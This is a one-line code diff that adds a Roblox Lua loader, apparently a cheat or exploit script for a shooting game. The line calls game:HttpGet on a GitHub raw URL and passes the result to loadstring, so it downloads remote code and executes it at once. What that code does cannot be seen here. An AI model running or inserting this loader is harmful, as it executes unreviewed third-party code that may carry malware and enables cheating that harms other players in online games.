@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/akiopz/-ez/main/Shooting/init.lua"))()
